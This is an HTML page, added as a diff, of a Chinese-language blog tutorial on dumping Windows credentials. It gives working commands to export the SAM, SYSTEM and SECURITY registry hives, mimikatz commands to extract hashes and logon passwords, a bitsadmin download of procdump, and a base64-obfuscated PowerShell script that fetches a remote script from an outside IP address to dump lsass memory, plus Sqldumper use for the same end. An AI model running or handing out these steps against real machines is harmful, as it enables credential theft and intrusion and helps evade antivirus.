@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。 SAM(Security Accounts Manager)windows下的密码(HASH值)由SAM数据库储存，位置在C:\windows\system32\config\sam  0x01 注册表1234567Reg从注册表提取SAM：reg save HKLM\SYSTEM sys.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Credential Access Dumping">
+<meta property="og:url" content="http://yoursite.com/2019/06/26/Credential Access Dumping/index.html">
+<meta property="og:site_name" content="c1y2m3’blog">
+<meta property="og:description" content="凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。 SAM(Security Accounts Manager)windows下的密码(HASH值)由SAM数据库储存，位置在C:\windows\system32\config\sam  0x01 注册表1234567Reg从注册表提取SAM：reg save HKLM\SYSTEM sys.">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16217aa3725939b7b0a288">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d1621c028011f4ba7fc9ded">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d1621f76d67ff7d0fb04601">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d1622566d67ff7d0fb0473b">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d1622af28011f4ba7fca1e0">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d1622e06d67ff7d0fb049ac">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16234bb54c8d56a98f4c24">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d1623cea3725939b7b0ad96">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16240fa3725939b7b0af06">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16243b28011f4ba7fcaa41">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16246ea3725939b7b0b112">
+<meta property="og:updated_time" content="2019-06-28T14:42:01.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Credential Access Dumping">
+<meta name="twitter:description" content="凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。 SAM(Security Accounts Manager)windows下的密码(HASH值)由SAM数据库储存，位置在C:\windows\system32\config\sam  0x01 注册表1234567Reg从注册表提取SAM：reg save HKLM\SYSTEM sys.">
+<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5d16217aa3725939b7b0a288">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Credential Access Dumping</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/c1y2m3.github.io/2019/06/27/GPP/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/c1y2m3.github.io/2019/05/26/26/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/06/26/Credential Access Dumping/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&text=Credential Access Dumping"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&is_video=false&description=Credential Access Dumping"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Credential Access Dumping&body=Check out this article: http://yoursite.com/2019/06/26/Credential Access Dumping/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&name=Credential Access Dumping&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SAM-Security-Accounts-Manager"><span class="toc-number">1.</span> <span class="toc-text">SAM(Security Accounts Manager)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-注册表"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 注册表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Local-Security-Authority-LSA"><span class="toc-number">2.</span> <span class="toc-text">Local Security Authority (LSA)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-prodump-exe"><span class="toc-number">2.1.</span> <span class="toc-text">0x02 prodump.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Powershell"><span class="toc-number">2.2.</span> <span class="toc-text">0x03 Powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Sqldumper-exe"><span class="toc-number">2.3.</span> <span class="toc-text">0x04 Sqldumper.exe</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Credential Access Dumping
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">c1y2m3’blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-06-26T02:40:00.000Z" itemprop="datePublished">2019-06-26</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。</p>
+<h2 id="SAM-Security-Accounts-Manager"><a href="#SAM-Security-Accounts-Manager" class="headerlink" title="SAM(Security Accounts Manager)"></a>SAM(Security Accounts Manager)</h2><p>windows下的密码(HASH值)由SAM数据库储存，位置在C:\windows\system32\config\sam </p>
+<h3 id="0x01-注册表"><a href="#0x01-注册表" class="headerlink" title="0x01 注册表"></a>0x01 注册表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Reg从注册表提取SAM：</span><br><span class="line"></span><br><span class="line">reg save HKLM\SYSTEM sys.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line"></span><br><span class="line">reg save hklm\security security.hiv</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d16217aa3725939b7b0a288" alt=""></p>
+<p>接着拉回本地机器 (很多环境下，不允许上传或者使用mimikatz。而针对非域控的单机离线提取hash显得尤为重要。) 接着用 mimikatz 加载这两个文件正常读取即可。</p>
+<p><code># mimikatz.exe &quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot; exit</code></p>
+<p>  <img src="https://www.yunzhijia.com/microblog/filesvr/5d1621c028011f4ba7fc9ded" alt=""></p>
+<p>同时也可以使用impacket套件中的secretsdump.py脚本进行解密。</p>
+<p>仓库地址：<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a></p>
+<p>Exe单文件版：<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a> (32位)</p>
+<p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d1621f76d67ff7d0fb04601" alt=""></p>
+<h2 id="Local-Security-Authority-LSA"><a href="#Local-Security-Authority-LSA" class="headerlink" title="Local Security Authority (LSA)"></a>Local Security Authority (LSA)</h2><p>本地安全机构（LSA）是受 Microsoft Windows 保护的子系统，它是 Windows 客户端身份验证体系结构的一部分，该体系结构对本地计算机进行身份验证并创建登录会话。</p>
+<p>LSA 是一个认证机制</p>
+<h3 id="0x02-prodump-exe"><a href="#0x02-prodump-exe" class="headerlink" title="0x02 prodump.exe"></a>0x02 prodump.exe</h3><p>利用微软提供的prodump.exe 工具指定 lsass.exe 进程名进行抓取,</p>
+<p>bitsadmin /rawreturn /transfer getfile <a href="https://raw.githubusercontent.com/klionsec/CommonTools/master/procdump.exe" target="_blank" rel="noopener">https://raw.githubusercontent.com/klionsec/CommonTools/master/procdump.exe</a> c:\windows\temp\dump.exe  </p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d1622566d67ff7d0fb0473b" alt=""></p>
+<p>接着，拖回本地用mimikatz.exe加载读取。</p>
+<p><code># mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</code></p>
+<p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d1622af28011f4ba7fca1e0" alt=""></p>
+<h3 id="0x03-Powershell"><a href="#0x03-Powershell" class="headerlink" title="0x03 Powershell"></a>0x03 Powershell</h3><p>同时也可以使用powershell 进行远程加载利用方式，利用base64进行简单的混淆加密</p>
+<p>如下：</p>
+<p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d1622e06d67ff7d0fb049ac" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$address = &quot;119.29.205.214&quot;</span><br><span class="line">$downport = &quot;80&quot;</span><br><span class="line"></span><br><span class="line">$count1 = &#123;</span><br><span class="line">$n=new-object net.webclient;</span><br><span class="line">$n.proxy=[Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;&#125;</span><br><span class="line"></span><br><span class="line">$count2 = &apos;IEX&apos; +&quot; &quot;+ &apos;$n&apos;+&apos;.downloadstring&apos;+&quot;(&apos;http://$&#123;address&#125;:$downport/Out-Minidump.ps1&apos;)&quot;</span><br><span class="line"></span><br><span class="line">$count3 = &quot;Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp&quot;</span><br><span class="line"></span><br><span class="line">$count = (&quot;$count1&quot; +&quot;`n&quot;+ &quot;$count2&quot;+&quot;`n&quot;+$count3)</span><br><span class="line"></span><br><span class="line">echo $count</span><br><span class="line"></span><br><span class="line">Function base64([string]$string)&#123;</span><br><span class="line">$byteArray = [System.Text.UnicodeEncoding]::Unicode.GetBytes($string)</span><br><span class="line">[Convert]::ToBase64String( $byteArray )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$base64 = base64 $count</span><br><span class="line"></span><br><span class="line">$end = (&quot;powershell -ENC &quot; + $base64)</span><br></pre></td></tr></table></figure>
+<p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d16234bb54c8d56a98f4c24" alt=""></p>
+<h3 id="0x04-Sqldumper-exe"><a href="#0x04-Sqldumper-exe" class="headerlink" title="0x04 Sqldumper.exe"></a>0x04 Sqldumper.exe</h3><p>除此之外，还可以使用mssql安装目录下自带的Sqldumper.exe，他要比prodump.exe 小很多很多，如果目标机器上直接就有 mssql ，直接使用即可，没有则直接上传上去就好了。</p>
+<p>(一般不会存在被AV杀掉的可能，除非安装的杀毒软件有dump内存文件保护。</p>
+<p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d1623cea3725939b7b0ad96" alt=""></p>
+<p><code># tasklist | findstr &quot;lsass.exe&quot; 先找到 lsass.exe 进程 id</code></p>
+<p>使用用法：</p>
+<p>SqlDumper <process id="" (pid)=""> <thread id="" (tid)=""> &lt;Flags:Minidump Flags&gt; <sqlinfoptr> <dump directory=""></dump></sqlinfoptr></thread></process></p>
+<p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d16240fa3725939b7b0af06" alt=""></p>
+<p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d16243b28011f4ba7fcaa41" alt=""></p>
+<p><code># mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</code></p>
+<p>如下：</p>
+<p> <img src="https://www.yunzhijia.com/microblog/filesvr/5d16246ea3725939b7b0b112" alt=""></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SAM-Security-Accounts-Manager"><span class="toc-number">1.</span> <span class="toc-text">SAM(Security Accounts Manager)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-注册表"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 注册表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Local-Security-Authority-LSA"><span class="toc-number">2.</span> <span class="toc-text">Local Security Authority (LSA)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-prodump-exe"><span class="toc-number">2.1.</span> <span class="toc-text">0x02 prodump.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Powershell"><span class="toc-number">2.2.</span> <span class="toc-text">0x03 Powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Sqldumper-exe"><span class="toc-number">2.3.</span> <span class="toc-text">0x04 Sqldumper.exe</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/06/26/Credential Access Dumping/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&text=Credential Access Dumping"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&is_video=false&description=Credential Access Dumping"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Credential Access Dumping&body=Check out this article: http://yoursite.com/2019/06/26/Credential Access Dumping/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&title=Credential Access Dumping"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/06/26/Credential Access Dumping/&name=Credential Access Dumping&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/c1y2m3.github.io/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
